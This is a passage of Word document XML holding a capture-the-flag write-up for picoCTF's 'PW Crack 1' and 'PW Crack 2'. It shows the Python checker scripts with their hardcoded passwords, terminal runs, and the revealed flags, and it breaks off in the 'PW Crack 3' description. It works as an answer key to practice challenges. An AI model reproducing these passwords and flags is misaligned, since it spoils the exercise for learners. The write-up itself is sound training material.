          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>flag_enc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> = open('level1.flag.txt.enc', '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>rb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4113339F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18B03FD8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3C8DF638" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D2B9764" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>def level_1_pw_check():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C5B9105" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> = input("Please enter correct password for flag: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD767C6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">    if( </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> == </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>"691d"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B4F39D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        print("Welcome back... your flag, user:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69F2C252"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2115C066" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(decryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A82BF27" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64EC1A8D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">    print("That password is incorrect")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C375D4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="758C215A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1BE863A5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D4384C9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>level_1_pw_check()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6249F6AC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve">:~/Downloads$ python3 level1.py </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A8914A7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Please enter correct password for flag: 691d</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07EA214A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Welcome back... your flag, user:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C0BC676" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>{545h_r1ng1ng_56891419}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC967A6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>PW Crack 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B9A096C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F683DF7" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1DFC61" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1267F24D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38C73E61" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you crack the password to get the flag? Download the password checker </w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and you'll need the encrypted </w:t>
      </w:r>
      <w:hyperlink r:id="rId25" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> in the same directory too.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB0D0E0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>:~/Downloads$ cat level2.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7049FFB5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>### THIS FUNCTION WILL NOT HELP YOU FIND THE FLAG --LT ########################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61E3B6E4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">def </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>str_xor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(secret, key):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77EC37A5" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    #extend key to secret length</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C1FA795" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>new_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = key</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256CD5AC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B4DF974" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    while </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>new_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">) &lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(secret):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5967CC67" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>new_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>new_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> + key[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E196F85" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> + 1) % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>len</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">(key)        </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30D834EF" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    return "".join([chr(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ord</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>secret_c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">) ^ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>ord</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>new_key_c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)) for (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>secret_c,new_key_c</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>) in zip(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>secret,new_key</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>)])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="717372CA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>###############################################################################</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75079189" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E67332D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>flag_enc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = open('level2.flag.txt.enc', '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>rb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>').read()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1823094F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1328EBE0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23EDB17D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70BEDC54" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>def level_2_pw_check():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65176D23" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> = input("Please enter correct password for flag: ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC2C3D6" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> if( </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>user_pw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve"> == chr(0x34) + chr(0x65) + chr(0x63) + chr(0x39) ):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DFC6B4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        print("Welcome back... your flag, user:")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D6B8B0"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1F7814DA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        print(decryption)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC4ABA9" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FFA62A2" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    print("That password is incorrect")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43A6E4CD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74A4615D" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>print(chr(0x34) + chr(0x65) + chr(0x63) + chr(0x39))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61382545" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>4ec9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FAA4E7"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level2.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47950DC8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Please enter correct password for flag: 4ec9</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3E7FA8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>Welcome back... your flag, user:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44B42D3E" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:t>{tr45h_51ng1ng_9701e681}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F387BDD" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44F4AD0B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>PW Crack 3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="799F5E14" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>| 100 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71E9125C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15723F3F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: LT '</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>syreal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>' Jones</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF1160C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DE7B31B" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Can you crack the password to get the flag? Download the password checker </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>here</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and you'll need the encrypted </w:t>
      </w:r>
      <w:hyperlink r:id="rId27" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>flag</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:hyperlink r:id="rId28" w:tgtFrame="_blank">
        <w:r>
          <w:rPr>
